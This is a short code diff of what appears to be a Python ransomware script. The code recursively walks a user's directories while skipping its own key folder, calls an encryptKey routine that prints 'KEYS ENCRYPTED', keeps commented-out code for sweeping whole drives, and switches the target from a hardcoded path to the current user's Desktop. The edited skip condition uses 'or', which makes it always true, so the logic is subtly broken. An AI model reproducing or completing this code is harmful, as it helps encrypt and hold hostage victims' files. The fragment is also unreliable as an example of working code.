@@ -52,7 +52,7 @@ def dir(path):
 		lst = os.listdir(path)
 		for i in range(len(lst)):
 			lst[i] = path + "\\" + lst[i]
-			if 'KEYS\\' not in lst[i]:
+			if 'KEYS\\' not in lst[i] or 'm0ng0li4n\\' not in lst[i]:
 				dir(lst[i])
 			else:
 				pass
@@ -89,7 +89,7 @@ def encryptKey():
 	print(colored(Fore.GREEN + "[+] KEYS ENCRYPTED"))
 
 def main():
-	global keys_folder
+	global keys_folder, user
 	try:
 		os.makedirs(keys_folder)
 	except:
@@ -98,6 +98,6 @@ def main():
 #	drives = drives.split('\000')[:-1]
 #	for drive in drives:
 #		dir(drive)
-	dir("C:\\Users\\Radhey\\OneDrive\\Desktop\\New folder")
+	dir('C:\\Users\\'+ user +'\\Desktop\\New folder')
 #	dir("C:")
 	encryptKey()
